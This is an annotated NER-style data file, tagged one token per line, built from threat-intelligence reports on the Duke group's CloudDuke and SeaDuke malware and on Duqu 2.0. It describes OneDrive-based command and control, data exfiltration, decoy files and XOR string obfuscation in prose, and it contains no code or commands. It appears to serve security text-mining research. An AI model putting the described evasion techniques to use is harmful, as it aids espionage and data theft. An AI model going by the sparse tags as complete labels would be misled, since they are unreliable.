execution	O
of	O
the	O
malicious	O
archive	O
linked	O
to	O
in	O
the	O
emails	O
has	O
not	O
resulted	O
in	O
the	O
execution	O
of	O
the	O
CloudDuke	O
downloader	O
but	O
in	O
the	O
execution	O
of	O
the	O
"	O
BastionSolution	O
"	O
component	O
thereby	O
skipping	O
one	O
step	O
from	O
the	O
process	O
described	O
for	O
the	O
other	O
CloudDuke	O
spear	O
-	O
phishing	O
campaigns	O
.	O
Developing	O
even	O
a	O
single	O
multipurpose	O
malware	O
toolset	O
,	O
never	O
mind	O
many	O
,	O
requires	O
time	O
and	O
resources	O
.	O
Therefore	O
it	O
seems	O
logical	O
to	O
attempt	O
to	O
reuse	O
code	O
such	O
as	O
supporting	O
frameworks	O
between	O
different	O
toolsets	O
.	O
The	O
Duke	O
group	O
,	O
however	O
,	O
appear	O
to	O
have	O
taken	O
this	O
a	O
step	O
further	O
with	O
SeaDuke	O
and	O
the	O
CloudDuke	O
component	O
BastionSolution	O
,	O
by	O
rewriting	O
the	O
same	O
code	O
in	O
multiple	O
programming	O
languages	O
.	O
This	O
has	O
the	O
obvious	O
benefits	O
of	O
saving	O
time	O
and	O
resources	O
by	O
providing	O
two	O
malware	O
toolsets	O
,	O
that	O
while	O
similar	O
on	O
the	O
inside	O
,	O
appear	O
completely	O
different	O
on	O
the	O
outside	O
.	O
This	O
way	O
,	O
the	O
discovery	O
of	O
one	O
toolset	O
does	O
not	O
immediately	O
lead	O
to	O
the	O
discovery	O
of	O
the	O
second	O
toolset	O
.	O
The	O
Duke	O
group	O
,	O
long	O
suspected	O
of	O
ties	O
to	O
the	O
Russian	O
state	O
,	O
have	O
been	O
running	O
their	O
espionage	O
operation	O
for	O
an	O
unusually	O
long	O
time	O
and	O
-	O
especially	O
lately	O
-	O
with	O
unusual	O
brazenness	O
.	O
These	O
latest	O
CloudDuke	O
and	O
SeaDuke	O
campaigns	O
appear	O
to	O
be	O
a	O
clear	O
sign	O
that	O
the	O
Duke	O
's	O
are	O
not	O
planning	O
to	O
stop	O
any	O
time	O
soon	O
.	O
Research	O
and	O
post	O
by	O
Artturi	O
(	O
@lehtior2	O
)	O
F	O
-	O
Secure	O
detects	O
CloudDuke	O
as	O
Trojan	O
:	O
W32/CloudDuke	O
.	O
B	O
and	O
Trojan	O
:	O
W64/CloudDuke	O
.	O
B	O
Samples	O
.	O
Compromised	O
servers	O
used	O
for	O
command	O
and	O
control	O
.	O
Compromised	O
websites	O
used	O
to	O
host	O
CloudDuke	O
.	O
Recent	O
weeks	O
have	O
seen	O
the	O
outing	O
of	O
two	O
new	O
additions	O
to	O
the	O
Duke	O
group	O
's	O
toolset	O
,	O
SeaDuke	O
and	O
CloudDuke	O
.	O
Of	O
these	O
,	O
SeaDuke	O
is	O
a	O
simple	O
trojan	O
made	O
interesting	O
by	O
the	O
fact	O
that	O
it	O
's	O
written	O
in	O
Python	O
.	O
And	O
even	O
more	O
curiously	O
,	O
SeaDuke	O
,	O
with	O
its	O
built	O
-	O
in	O
support	O
for	O
both	O
Windows	O
and	O
Linux	O
,	O
is	O
the	O
first	O
cross	O
-	O
platform	O
malware	O
we	O
have	O
observed	O
from	O
the	O
Duke	O
group	O
.	O
While	O
SeaDuke	O
is	O
a	O
single	O
-	O
albeit	O
cross-	O
platform	O
-	O
trojan	O
,	O
CloudDuke	O
appears	O
to	O
be	O
an	O
entire	O
toolset	O
of	O
malware	O
components	O
,	O
or	O
"	O
solutions	O
"	O
as	O
the	O
Duke	O
group	O
apparently	O
calls	O
them	O
.	O
These	O
components	O
include	O
a	O
unique	O
loader	O
,	O
downloader	O
,	O
and	O
not	O
one	O
but	O
two	O
different	O
trojan	O
components	O
.	O
CloudDuke	O
also	O
greatly	O
expands	O
on	O
the	O
Duke	O
group	O
's	O
usage	O
of	O
cloud	O
storage	O
services	O
,	O
specifically	O
Microsoft	O
's	O
OneDrive	O
,	O
as	O
a	O
channel	O
for	O
both	O
command	O
and	O
control	O
as	O
well	O
as	O
the	O
exfiltration	O
of	O
stolen	O
data	O
.	O
Finally	O
,	O
some	O
of	O
the	O
recent	O
CloudDuke	O
spear	O
-	O
phishing	O
campaigns	O
have	O
born	O
a	O
striking	O
resemblance	O
to	O
CozyDuke	O
spear	O
-	O
phishing	O
campaigns	O
from	O
a	O
year	O
ago	O
.	O
Last	O
week	O
,	O
both	O
Symantec	O
and	O
Palo	O
Alto	O
Networks	O
published	O
research	O
on	O
SeaDuke	O
,	O
a	O
newer	O
addition	O
to	O
the	O
arsenal	O
of	O
trojans	O
being	O
used	O
by	O
the	O
Duke	O
group	O
.	O
While	O
older	O
malware	O
by	O
the	O
Duke	O
group	O
has	O
always	O
been	O
written	O
with	O
a	O
combination	O
of	O
the	O
C	O
and	O
C++	O
programming	O
languages	O
as	O
well	O
as	O
assembly	O
language	O
,	O
SeaDuke	O
is	O
peculiarly	O
written	O
in	O
Python	O
with	O
multiple	O
layers	O
of	O
obfuscation	O
.	O
This	O
Python	O
code	O
is	O
usually	O
then	O
compiled	O
into	O
Windows	O
executables	O
using	O
py2exe	O
or	O
pyinstaller	O
.	O
However	O
,	O
the	O
Python	O
code	O
itself	O
has	O
been	O
designed	O
to	O
work	O
on	O
both	O
Windows	O
and	O
Linux	O
.	O
We	O
therefore	O
suspect	O
,	O
that	O
the	O
Duke	O
group	O
is	O
also	O
using	O
the	O
same	O
SeaDuke	O
Python	O
code	O
to	O
target	O
Linux	O
victims	O
.	O
This	O
is	O
the	O
first	O
time	O
we	O
have	O
seen	O
the	O
Duke	O
group	O
employ	O
malware	O
to	O
target	O
Linux	O
platforms	O
.	O
Last	O
week	O
,	O
we	O
also	O
saw	O
Palo	O
Alto	O
Networks	O
and	O
Kaspersky	O
Labs	O
publish	O
research	O
on	O
malware	O
components	O
they	O
respectively	O
called	O
MiniDionis	O
and	O
CloudLook	O
.	O
MiniDionis	O
and	O
CloudLook	O
are	O
both	O
components	O
of	O
a	O
larger	O
malware	O
toolset	O
we	O
call	O
CloudDuke	O
.	O
This	O
toolset	O
consists	O
of	O
malware	O
components	O
that	O
provide	O
varying	O
functionality	O
while	O
partially	O
relying	O
on	O
a	O
shared	O
code	O
framework	O
and	O
always	O
using	O
the	O
same	O
loader	O
.	O
Based	O
on	O
PDB	O
strings	O
found	O
in	O
the	O
samples	O
,	O
the	O
malware	O
authors	O
refer	O
to	O
the	O
CloudDuke	O
components	O
as	O
"	O
solutions	O
"	O
with	O
names	O
such	O
as	O
"	O
DropperSolution	O
"	O
,	O
"	O
BastionSolution	O
"	O
and	O
"	O
OneDriveSolution	O
"	O
.	O
A	O
list	O
of	O
PDB	O
strings	O
we	O
have	O
observed	O
is	O
below	O
.	O
The	O
first	O
of	O
the	O
CloudDuke	O
components	O
we	O
have	O
observed	O
is	O
a	O
downloader	O
internally	O
called	O
"	O
DropperSolution	O
"	O
.	O
The	O
purpose	O
of	O
the	B-Entity
downloader	I-Entity
is	O
to	O
download	O
and	O
execute	O
additional	O
malware	O
on	O
the	O
victim	B-Entity
's	I-Entity
system	I-Entity
.	O
In	O
most	O
observed	O
cases	O
,	O
the	B-Entity
downloader	I-Entity
will	O
attempt	O
to	O
connect	B-Action
to	B-Modifier
a	O
compromised	B-Entity
website	I-Entity
to	B-Modifier
download	O
an	O
encrypted	B-Entity
malicious	I-Entity
payload	I-Entity
which	O
the	B-Entity
downloader	I-Entity
will	O
decrypt	O
and	O
execute	O
.	O
Depending	O
on	O
the	O
way	O
the	O
downloader	O
has	O
been	O
configured	O
,	O
in	O
some	O
cases	O
it	O
may	O
first	O
attempt	O
to	O
log	O
in	O
to	O
Microsoft	O
's	O
cloud	O
storage	O
service	O
OneDrive	O
and	O
retrieve	O
the	O
payload	O
from	O
there	O
.	O
If	O
no	O
payload	O
is	O
available	O
from	O
OneDrive	O
,	O
the	O
downloader	O
will	O
revert	O
to	O
the	O
previously	O
mentioned	O
method	O
of	O
downloading	O
from	O
compromised	O
websites	O
.	O
We	O
have	O
also	O
observed	O
two	O
distinct	O
trojan	O
components	O
in	O
the	O
CloudDuke	O
toolset	O
.	O
The	O
first	O
of	O
these	O
,	O
internally	O
called	O
"	O
BastionSolution	O
"	O
,	O
is	O
the	O
trojan	O
that	O
Palo	O
Alto	O
Networks	O
described	O
in	O
their	O
research	O
into	O
"	O
MiniDionis	O
"	O
.	O
Interestingly	O
,	O
BastionSolution	O
appears	O
to	O
functionally	O
be	O
an	O
exact	O
copy	O
of	O
SeaDuke	O
with	O
the	O
only	O
real	O
difference	O
being	O
the	O
choice	O
of	O
programming	O
language	O
.	O
BastionSolution	O
also	O
makes	O
significant	O
use	O
of	O
a	O
code	O
framework	O
that	O
is	O
apparently	O
internally	O
called	O
"	O
Z	O
"	O
.	O
This	O
framework	O
provides	O
classes	O
for	O
functionality	O
such	O
as	O
encryption	O
,	O
compression	O
,	O
randomization	O
and	O
network	O
communications	O
.	O
Classes	O
from	O
the	O
same	O
"	O
Z	O
"	O
framework	O
,	O
such	O
as	O
the	O
encryption	O
and	O
randomization	O
classes	O
,	O
are	O
also	O
used	O
by	O
the	O
second	O
trojan	O
component	O
of	O
the	O
CloudDuke	O
toolset	O
.	O
This	O
second	O
component	O
,	O
internally	O
called	O
"	O
OneDriveSolution	O
"	O
,	O
is	O
especially	O
interesting	O
because	O
it	O
relies	O
on	O
Microsoft	O
's	O
cloud	O
storage	O
service	O
OneDrive	O
as	O
its	O
command	O
and	O
control	O
channel	O
.	O
To	O
achieve	O
this	O
,	O
OneDriveSolution	O
will	O
attempt	O
to	O
log	O
into	O
OneDrive	O
with	O
a	O
preconfigured	O
username	O
and	O
password	O
.	O
If	O
successful	O
,	O
OneDriveSolution	O
will	O
then	O
proceed	O
to	O
copy	B-Action
data	B-Entity
from	O
the	O
victim	B-Entity
's	I-Entity
computer	I-Entity
to	B-Modifier
the	O
OneDrive	B-Entity
account	I-Entity
.	O
It	O
will	O
also	O
search	O
the	O
OneDrive	B-Entity
account	I-Entity
for	O
files	B-Action
containing	B-Entity
commands	I-Entity
for	I-Entity
the	I-Entity
malware	I-Entity
to	I-Entity
execute	I-Entity
.	O
All	O
of	O
the	O
CloudDuke	O
"	O
solutions	O
"	O
use	B-Action
the	B-Entity
same	I-Entity
loader	I-Entity
,	O
a	O
piece	O
of	O
code	O
whose	O
primary	O
purpose	O
is	O
to	O
decrypt	O
the	O
embedded	O
,	O
encrypted	O
solution	O
,	O
load	B-Action
it	B-Entity
in	B-Modifier
memory	B-Entity
and	O
execute	B-Action
it	B-Entity
.	O
The	O
Duke	O
group	O
has	O
often	O
employed	O
loaders	O
for	O
their	O
malware	O
but	O
unlike	O
the	O
previous	O
loaders	O
they	O
have	O
used	O
,	O
the	O
CloudDuke	O
loader	O
is	O
much	O
more	O
versatile	O
with	O
support	O
for	O
multiple	O
methods	O
of	O
loading	O
and	O
executing	O
the	O
final	O
payload	O
as	O
well	O
as	O
the	O
ability	O
to	O
write	O
to	O
disk	O
and	O
execute	O
additional	O
malware	O
components	O
.	O
CloudDuke	O
has	O
recently	O
been	O
spread	O
via	O
spear	O
-	O
phishing	O
emails	O
with	O
targets	O
reportedly	O
including	O
organizations	O
such	O
as	O
the	O
US	O
Department	O
of	O
Defense	O
.	O
These	O
spear	O
-	O
phising	O
emails	O
have	O
contained	O
links	O
to	O
compromised	O
websites	O
hosting	O
zip	O
archives	O
that	O
contain	O
CloudDuke	O
-	O
laden	O
executables	O
.	O
In	O
most	O
cases	O
,	O
executing	O
these	O
executables	O
will	O
have	O
resulted	O
in	O
two	B-Entity
additional	I-Entity
files	I-Entity
being	B-Action
written	I-Action
to	B-Modifier
the	O
victim	B-Entity
's	I-Entity
hard	I-Entity
disk	I-Entity
.	O
The	O
first	O
of	O
these	O
files	O
has	O
been	O
a	O
decoy	O
,	O
such	O
as	O
an	O
audio	O
file	O
or	O
a	O
PDF	O
file	O
while	O
the	O
second	O
one	O
has	O
been	O
a	O
CloudDuke	O
loader	O
embedding	O
a	O
CloudDuke	O
downloader	O
,	O
the	O
so	O
-	O
called	O
"	O
DropperSolution	O
"	O
.	O
In	O
these	O
cases	O
,	O
the	O
victim	O
has	O
been	O
presented	O
with	O
the	O
decoy	O
file	O
while	O
in	O
the	O
background	O
the	O
downloader	O
has	O
proceeded	O
to	O
download	O
and	O
execute	O
one	O
of	O
the	O
CloudDuke	O
trojans	O
,	O
"	O
OneDriveSolution	O
"	O
or	O
"	O
BastionSolution	O
"	O
.	O
Interestingly	O
,	O
however	O
,	O
some	O
of	O
the	O
other	O
CloudDuke	O
spear	O
-	O
phishing	O
campaigns	O
we	O
have	O
observed	O
this	O
July	O
have	O
born	O
a	O
striking	O
resemblance	O
to	O
CozyDuke	O
spear	O
-	O
phishing	O
campaigns	O
seen	O
almost	O
exactly	O
a	O
year	O
ago	O
,	O
in	O
the	O
beginning	O
of	O
July	O
2014	O
.	O
In	O
both	O
spear	O
-	O
phishing	O
campaigns	O
,	O
the	O
decoy	O
document	O
has	O
been	O
the	O
exact	O
same	O
PDF	O
file	O
,	O
a	O
"	O
US	O
letter	O
fax	O
test	O
page	O
"	O
(	O
28d29c702fdf3c16f27b33f3e32687dd82185e8b	O
)	O
.	O
Similarly	O
,	O
the	O
URLs	O
hosting	O
the	O
malicious	O
files	O
have	O
,	O
in	O
both	O
campaigns	O
,	O
purported	O
to	O
be	O
related	O
to	O
eFaxes	O
.	O
It	O
is	O
also	O
interesting	O
to	O
note	O
,	O
that	O
in	O
the	O
case	O
of	O
the	O
CozyDuke	O
-	O
inspired	O
CloudDuke	O
spear	O
-	O
phishing	O
campaign	O
,	O
the	O
downloading	O
and	O
execution	O
of	O
the	O
malicious	O
archive	O
linked	O
to	O
in	O
the	O
emails	O
has	O
not	O
resulted	O
in	O
the	O
execution	O
of	O
the	O
CloudDuke	O
downloader	O
but	O
in	O
the	O
execution	O
of	O
the	O
"	O
BastionSolution	O
"	O
component	O
thereby	O
skipping	O
one	O
step	O
from	O
the	O
process	O
described	O
for	O
the	O
other	O
CloudDuke	O
spear	O
-	O
phishing	O
campaigns	O
.	O
CloudDuke	O
is	O
not	O
the	O
first	O
time	O
we	O
have	O
observed	O
the	O
Duke	O
group	O
use	O
cloud	O
services	O
in	O
general	O
and	O
Microsoft	O
OneDrive	O
specifically	O
as	O
part	O
of	O
their	O
operations	O
.	O
Earlier	O
this	O
spring	O
we	O
released	O
research	O
on	O
CozyDuke	O
where	O
we	O
mentioned	O
observing	O
CozyDuke	O
sometimes	O
either	O
directly	O
use	O
a	O
OneDrive	O
account	O
to	O
exfiltrate	O
stolen	O
data	O
or	O
alternatively	O
CozyDuke	O
downloading	O
Visual	O
Basic	O
scripts	O
that	O
would	O
copy	O
stolen	O
files	O
to	O
a	O
OneDrive	O
account	O
and	O
sometimes	O
even	O
retrieve	O
files	O
containing	O
additional	O
commands	O
from	O
the	O
same	O
OneDrive	O
account	O
.	O
In	O
these	O
previous	O
cases	O
the	O
Duke	O
group	O
has	O
only	O
used	O
OneDrive	O
as	O
a	O
secondary	O
communication	O
channel	O
but	O
still	O
relied	O
on	O
more	O
traditional	O
C&C	O
channels	O
for	O
most	O
of	O
their	O
actions	O
.	O
It	O
is	O
therefore	O
interesting	O
to	O
note	O
that	O
CloudDuke	O
actually	O
enables	O
the	O
Duke	O
group	O
to	O
rely	O
solely	O
on	O
OneDrive	O
for	O
every	O
step	O
of	O
their	O
operation	O
from	O
downloading	O
the	O
actual	O
trojan	O
,	O
passing	O
commands	O
to	O
the	O
trojan	O
and	O
finally	O
exfiltrating	O
stolen	O
data	O
.	O
By	O
relying	O
solely	O
on	O
3rd	O
party	O
web	O
services	O
,	O
such	O
as	O
OneDrive	O
,	O
as	O
their	O
command	O
and	O
control	O
channel	O
,	O
we	O
believe	O
the	O
Duke	O
group	O
is	O
trying	O
to	O
better	O
evade	O
detection	O
.	O
Large	O
amounts	O
of	O
data	O
being	O
transferred	O
from	O
an	O
organization	O
's	O
network	O
to	O
an	O
unknown	O
web	O
server	O
easily	O
raises	O
suspicions	O
.	O
However	O
,	O
data	O
being	O
transferred	O
to	O
a	O
popular	O
cloud	O
storage	O
service	O
is	O
normal	O
.	O
What	O
better	O
way	O
for	O
an	O
attacker	O
to	O
surreptitiously	O
transfer	O
large	O
amounts	O
of	O
stolen	O
data	O
than	O
the	O
same	O
way	O
people	O
are	O
transferring	O
that	O
same	O
data	O
every	O
day	O
for	O
legitimate	O
reasons	O
.	O
(	O
Coincidentally	O
,	O
the	O
implications	O
of	O
3rd	O
party	O
web	O
services	O
being	O
used	O
as	O
command	O
and	O
control	O
channels	O
is	O
also	O
the	O
subject	O
of	O
an	O
upcoming	O
talk	O
at	O
the	O
VirusBulletin	O
2015	O
conference	O
)	O
.	O
Developing	O
even	O
a	O
single	O
multipurpose	O
malware	O
toolset	O
,	O
never	O
mind	O
many	O
,	O
requires	O
time	O
and	O
resources	O
.	O
Therefore	O
it	O
seems	O
logical	O
to	O
attempt	O
to	O
reuse	O
code	O
such	O
as	O
supporting	O
frameworks	O
between	O
different	O
toolsets	O
.	O
The	O
Duke	O
group	O
,	O
however	O
,	O
appear	O
to	O
have	O
taken	O
this	O
a	O
step	O
further	O
with	O
SeaDuke	O
and	O
the	O
CloudDuke	O
component	O
BastionSolution	O
,	O
by	O
rewriting	O
the	O
same	O
code	O
in	O
multiple	O
programming	O
languages	O
.	O
This	O
has	O
the	O
obvious	O
benefits	O
of	O
saving	O
time	O
and	O
resources	O
by	O
providing	O
two	O
malware	O
toolsets	O
,	O
that	O
while	O
similar	O
on	O
the	O
inside	O
,	O
appear	O
completely	O
different	O
on	O
the	O
outside	O
.	O
This	O
way	O
,	O
the	O
discovery	O
of	O
one	O
toolset	O
does	O
not	O
immediately	O
lead	O
to	O
the	O
discovery	O
of	O
the	O
second	O
toolset	O
.	O
The	O
Duke	O
group	O
,	O
long	O
suspected	O
of	O
ties	O
to	O
the	O
Russian	O
state	O
,	O
have	O
been	O
running	O
their	O
espionage	O
operation	O
for	O
an	O
unusually	O
long	O
time	O
and	O
-	O
especially	O
lately	O
-	O
with	O
unusual	O
brazenness	O
.	O
These	O
latest	O
CloudDuke	O
and	O
SeaDuke	O
campaigns	O
appear	O
to	O
be	O
a	O
clear	O
sign	O
that	O
the	O
Duke	O
's	O
are	O
not	O
planning	O
to	O
stop	O
any	O
time	O
soon	O
.	O
Research	O
and	O
post	O
by	O
Artturi	O
(	O
@lehtior2	O
)	O
F	O
-	O
Secure	O
detects	O
CloudDuke	O
as	O
Trojan	O
:	O
W32/CloudDuke	O
.	O
B	O
and	O
Trojan	O
:	O
W64/CloudDuke	O
.	O
B	O
Samples	O
.	O
Compromised	O
servers	O
used	O
for	O
command	O
and	O
control	O
.	O
Compromised	O
websites	O
used	O
to	O
host	O
CloudDuke	O
.	O
In	O
October	O
2011	O
,	O
we	O
analyzed	O
a	O
new	O
threat	O
what	O
we	O
named	O
Duqu	O
,	O
and	O
we	O
showed	O
that	O
it	O
has	O
close	O
relationships	O
to	O
the	O
infamous	O
Stuxnet	O
attack	O
.	O
By	O
courtesy	O
of	O
Kaspersky	O
Lab	O
,	O
in	O
late	O
May	O
2015	O
we	O
received	O
samples	O
about	O
a	O
new	O
threat	O
,	O
with	O
the	O
hint	O
that	O
it	O
might	O
be	O
related	O
to	O
the	O
Duqu	O
attacks	O
;	O
however	O
,	O
these	O
new	O
samples	O
are	O
from	O
2014	O
.	O
We	O
decided	O
to	O
carry	O
out	O
an	O
individual	O
research	O
on	O
the	O
samples	O
with	O
the	O
focus	O
on	O
the	O
connections	O
between	O
the	O
original	O
Duqu	O
attack	O
and	O
the	O
new	O
threat	O
,	O
dubbed	O
"	O
Duqu	O
2.0	O
"	O
.	O
After	O
analyzing	O
the	O
samples	O
received	O
,	O
we	O
think	O
,	O
that	O
the	O
adversaries	O
behind	O
Duqu	O
malware	O
are	O
back	O
and	O
active	O
;	O
while	O
they	O
modified	O
their	O
tools	O
to	O
be	O
undetected	O
by	O
old	O
methods	O
,	O
they	O
also	O
strongly	O
reused	O
codes	O
and	O
ideas	O
during	O
their	O
recent	O
attacks	O
.	O
The	O
numerous	O
similarities	O
that	O
we	O
discovered	O
between	O
Duqu	O
and	O
Duqu	O
2.0	O
include	O
the	O
following	O
.	O
In	O
this	O
report	O
,	O
we	O
present	O
supporting	O
details	O
and	O
analysis	O
for	O
all	O
the	O
similarities	O
listed	O
above	O
.	O
Stuxnet	O
is	O
probably	O
the	O
most	O
well	O
-	O
known	O
malware	O
of	O
our	O
times	O
.	O
Its	O
fame	O
stems	O
from	O
the	O
facts	O
that	O
it	O
targeted	O
a	O
very	O
specific	O
industrial	O
facility	O
,	O
namely	O
a	O
uranium	O
enrichment	O
plant	O
in	O
Iran	O
,	O
it	O
aimed	O
at	O
physical	O
destruction	O
of	O
uranium	O
centrifuges	O
,	O
and	O
it	O
apparently	O
accomplished	O
its	O
mission	O
successfully	O
.	O
In	O
addition	O
to	O
all	O
these	O
characteristics	O
,	O
IT	O
security	O
experts	O
also	O
appreciate	O
its	O
technical	O
sophistication	O
and	O
the	O
zero	O
-	O
day	O
exploits	O
that	O
it	O
used	O
.	O
Stuxnet	O
was	O
also	O
an	O
alarm	O
to	O
the	O
developed	O
world	O
:	O
it	O
shed	O
light	O
on	O
the	O
capabilities	O
of	O
advanced	O
attackers	O
,	O
and	O
at	O
the	O
same	O
time	O
,	O
on	O
the	O
numerous	O
weaknesses	O
of	O
our	O
computing	O
infrastructure	O
.	O
Putting	O
these	O
two	O
together	O
,	O
people	O
started	O
to	O
feel	O
hopelessly	O
vulnerable	O
.	O
Yet	O
,	O
unfortunately	O
,	O
Stuxnet	O
is	O
not	O
a	O
unique	O
example	O
for	O
a	O
highly	O
sophisticated	O
targeted	O
threat	O
,	O
but	O
there	O
are	O
numerous	O
other	O
pieces	O
of	O
malware	O
of	O
similar	O
kind	O
,	O
including	O
Duqu	O
,	O
Flame	O
,	O
Regin	O
,	O
etc	O
.	O
Among	O
those	O
,	O
Duqu	O
is	O
particularly	O
interesting	O
,	O
not	O
only	O
because	O
we	O
discovered	O
it	O
back	O
in	O
2011	O
,	O
but	O
because	O
our	O
analysis	O
pointed	O
out	O
that	O
-	O
while	O
Duqu	O
's	O
objective	O
is	O
different	O
-	O
it	O
has	O
very	O
strong	O
similarities	O
to	O
Stuxnet	O
in	O
terms	O
of	O
architecture	O
,	O
code	O
,	O
and	O
methods	O
to	O
achieve	O
stealthiness	O
.	O
Today	O
,	O
it	O
is	O
widely	O
believed	O
within	O
the	O
IT	O
security	O
community	O
that	O
Duqu	O
was	O
created	O
by	O
the	O
same	O
attackers	O
who	O
created	O
Stuxnet	O
.	O
And	O
now	O
we	O
have	O
a	O
new	O
member	O
of	O
the	O
same	O
family	O
!	O
Last	O
month	O
,	O
we	O
received	O
interesting	O
samples	O
from	O
Kaspersky	O
Lab	O
with	O
a	O
hint	O
that	O
they	O
might	O
be	O
related	O
to	O
the	O
Duqu	O
samples	O
of	O
2011	O
;	O
however	O
,	O
these	O
new	O
samples	O
are	O
from	O
2014	O
.	O
Our	O
common	O
understanding	O
was	O
that	O
it	O
would	O
be	O
interesting	O
to	O
figure	O
out	O
whether	O
this	O
new	O
threat	O
is	O
indeed	O
related	O
to	O
the	O
old	O
Duqu	O
attack	O
,	O
and	O
we	O
in	O
the	O
CrySyS	O
Lab	O
should	O
try	O
to	O
focus	O
our	O
analysis	O
efforts	O
on	O
answering	O
this	O
question	O
.	O
It	O
is	O
important	O
to	O
emphasize	O
that	O
we	O
did	O
our	O
analysis	O
independently	O
from	O
Kaspersky	O
Lab	O
:	O
we	O
did	O
not	O
read	O
their	O
preliminary	O
report	O
and	O
they	O
did	O
not	O
share	O
any	O
of	O
their	O
findings	O
with	O
us	O
(	O
apart	O
from	O
the	O
samples	O
that	O
we	O
received	O
from	O
them	O
)	O
.	O
The	O
analysis	O
results	O
performed	O
by	O
Kaspersky	O
Lab	O
can	O
be	O
read	O
in	O
the	O
following	O
report	O
.	O
https://securelist.com	O
/	O
blog	O
/	O
research/70504/the	O
-	O
mystery	O
-	O
of	O
-	O
duqu-	O
2	O
-	O
0-a	O
-	O
sophisticated	O
-	O
cyberespionage	O
-	O
actor	O
-	O
returns/	O
In	O
this	O
report	O
,	O
we	O
present	O
the	O
results	O
of	O
our	O
comparative	O
analysis	O
of	O
the	O
old	O
version	O
of	O
Duqu	O
and	O
the	O
new	O
version	O
,	O
codenamed	O
"	O
Duqu	O
2.0	O
"	O
.	O
We	O
concentrate	O
on	O
the	O
description	O
of	O
the	O
relevant	O
similarities	O
and	O
differences	O
we	O
have	O
found	O
between	O
the	O
two	O
malware	O
samples	O
.	O
In	O
the	O
table	O
below	O
,	O
one	O
can	O
see	O
the	O
MD5	O
fingerprints	O
of	O
the	O
two	O
samples	O
we	O
have	O
examined	O
during	O
our	O
initial	O
analysis	O
.	O
The	O
first	O
module	O
will	O
be	O
referenced	O
in	O
this	O
document	O
with	O
the	O
name	O
"	O
c7c647	O
"	O
,	O
and	O
the	O
second	O
with	O
the	O
name	O
"	O
3f52ea	O
"	O
according	O
to	O
the	O
prefix	O
of	O
their	O
MD5	O
hashes	O
.	O
In	O
the	O
following	O
chapter	O
,	O
we	O
will	O
discuss	O
the	O
most	O
conspicuous	O
similarities	O
and	O
differences	O
we	O
have	O
found	O
between	O
the	O
main	O
modules	O
of	O
Duqu	O
and	O
Duqu	O
2.0	O
.	O
Both	O
the	O
two	O
main	O
modules	O
of	O
Duqu	O
2.0	O
we	O
have	O
analyzed	O
(	O
"	O
c7c647	O
"	O
and	O
"	O
3f52ea	O
"	O
)	O
has	O
6	O
export	O
functions	O
which	O
can	O
be	O
seen	O
in	O
the	O
following	O
figure	O
.	O
The	O
new	O
sample	O
(	O
both	O
versions	O
)	O
is	O
one	O
big	O
executable	O
file	O
that	O
is	O
linked	O
by	O
multiple	O
modules	O
.	O
The	O
original	O
Duqu	O
had	O
a	O
main	O
module	O
that	O
was	O
divided	O
into	O
two	O
sub	O
-	O
modules	O
:	O
an	O
outside	O
layer	O
and	O
an	O
internal	O
part	O
.	O
In	O
one	O
version	O
,	O
the	O
internal	O
part	O
was	O
stored	O
in	O
a	O
specific	O
compressed	O
format	O
,	O
while	O
in	O
another	O
version	O
,	O
which	O
we	O
investigated	O
at	O
a	O
Duqu	O
victim	O
,	O
it	O
was	O
stored	O
in	O
cleartext	O
in	O
a	O
resource	O
data	O
section	O
of	O
the	O
main	O
executable	O
.	O
The	O
Duqu	O
2.0	O
version	O
we	O
investigated	O
is	O
different	O
:	O
everything	O
is	O
incorporated	O
in	O
the	O
main	O
executable	O
,	O
but	O
there	O
are	O
still	O
visible	O
marks	O
showing	O
that	O
the	O
malware	O
is	O
linked	O
/	O
compiled	O
from	O
multiple	O
different	O
parts	O
,	O
modules	O
.	O
Some	B-Action
of	B-Entity
the	I-Entity
strings	I-Entity
in	I-Entity
Duqu	I-Entity
2.0	I-Entity
are	O
obfuscated	B-Action
by	O
XOR	B-Entity
-	B-Entity
based	I-Entity
encryption	I-Entity
.	O
The	O
actual	O
routine	O
used	O
is	O
printed	O
below	O
.	O
The	O
decompiled	O
version	O
of	O
the	O
above	O
assembly	O
code	O
can	O
be	O
seen	O
in	O
the	O
following	O
sample	O
.	O
The	O
above	O
string	O
decryptor	O
routine	O
is	O
a	O
simple	O
XOR	O
decoder	O
.	O
It	O
simply	O
XORs	O
consecutive	O
4-byte	O
blocks	O
of	O
the	O
encrypted	O
string	O
buffer	O
,	O
given	O
by	O
its	O
pointer	O
in	O
the	O
first	O
parameter	O
of	O
the	O
function	O
,	O
with	O
a	O
fixed	O
4-byte	O
key	O
(	O
"	O
0x86F186F1	O
"	O
)	O
.	O
After	O
the	O
decryption	O
of	O
all	O
consecutive	O
4-	O
byte	O
blocks	O
,	O
the	O
actual	O
cleartext	O
block	O
is	O
stored	O
within	O
the	O
next	O
4	O
bytes	O
of	O
the	O
output	O
buffer	O
,	O
pointed	O
by	O
parameter	O
"	O
a2	O
"	O
.	O
The	O
decrypted	O
(	O
cleartext	O
)	O
string	O
is	O
terminated	O
with	O
a	O
"	O
\0	O
"	O
character	O
,	O
and	O
if	O
the	O
decryptor	O
cycle	O
reaches	O
the	O
end	O
of	O
the	O
(	O
cleartext	O
)	O
string	O
,	O
the	O
cleartext	O
string	O
will	O
be	O
pointed	O
by	O
the	O
address	O
stored	O
in	O
output	O
argument	O
"	O
a2	O
"	O
.	O
A	O
closer	O
look	O
at	O
the	O
above	O
C	O
code	O
reveals	O
that	O
the	O
string	O
decryptor	O
routine	O
actually	O
has	O
two	O
parameters	O
:	O
"	O
encrstr	O
"	O
and	O
"	O
a2	O
"	O
.	O
First	O
,	O
the	O
decryptor	O
function	O
checks	O
if	O
the	O
input	O
buffer	O
(	O
the	O
pointer	O
of	O
the	O
encrypted	O
string	O
)	O
points	O
to	O
a	O
valid	O
memory	O
area	O
(	O
i.e.	O
,	O
it	O
does	O
not	O
contain	O
NULL	O
value	O
)	O
.	O
After	O
that	O
,	O
the	O
first	O
4	O
bytes	O
of	O
the	O
encrypted	O
string	O
buffer	O
is	O
XORed	O
with	O
the	O
key	O
"	O
0x86F186F1	O
"	O
and	O
the	O
result	O
of	O
the	O
XOR	O
operation	O
is	O
stored	O
in	O
variable	O
"	O
result	O
"	O
.	O
The	O
first	O
DWORD	O
(	O
first	O
4	O
bytes	O
)	O
of	O
the	O
output	O
buffer	O
a2	O
is	O
then	O
populated	O
by	O
this	O
resulting	O
value	O
(	O
*	O
(	O
_	O
DWORD	O
*	O
)	O
a2	O
=	O
result	O
;	O
)	O
.	O
Therefore	O
,	O
the	O
first	O
4	O
bytes	O
of	O
the	O
output	O
buffer	O
will	O
contain	O
